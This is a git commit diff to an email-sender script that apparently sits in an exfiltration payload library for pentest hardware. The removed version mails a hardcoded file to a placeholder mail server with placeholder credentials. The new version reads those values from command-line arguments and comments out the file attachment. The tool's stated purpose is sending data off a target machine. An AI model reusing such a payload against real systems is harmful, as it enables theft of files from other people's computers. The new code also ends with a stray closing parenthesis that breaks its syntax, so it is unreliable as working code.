8f434d2dab27d5b89a0c705bdb483a501157a9ff
TheDragonkeeper <dragonkeeper@nixheads.co.uk>
2017-11-04 15:56:40 +0000

    Made changes so python can take bash parameters

--- payloads/library/exfiltration/Email-Sender/sendmail.py
+++ payloads/library/exfiltration/Email-Sender/sendmail.py
@@ -1,17 +1,19 @@
-# Title:	    Email-Sender
+# Title:            Email-Sender
 # Description:  Allows sending emails to a mail server, with file support
-#               this is used coupled with the extension 
-# Author: 	    TheDragonkeeper
-# Version:	    1.0
+#               this is used coupled with the extension
+# Author:           TheDragonkeeper
+# Version:          1.0
 # Category:     exfiltration
-# Target: 	    Any
+# Target:           Any
+
 
 import sys
 sys.path.append("/root/extensions")
 from sendemail import send_mail
 
-send_mail('im-just-a-squirrel@giving-you-my-nuts.net', 'EmailTo@SendTo.net',
-                   'You Got My Nuts',
-                   'Enjoy this package',
-                   files=["/Path/To/My/Nuts.txt"],
-                   server='MAIL.SERVER.com', username='USERNAME', password='PASSWORD')
+send_mail(sys.argv[1], sys.argv[2],
+                   sys.argv[3],
+                   sys.argv[4],
+#                   files=sys.argv[8],
+                   server=sys.argv[5], username=sys.argv[6], password=sys.argv[7])
+)
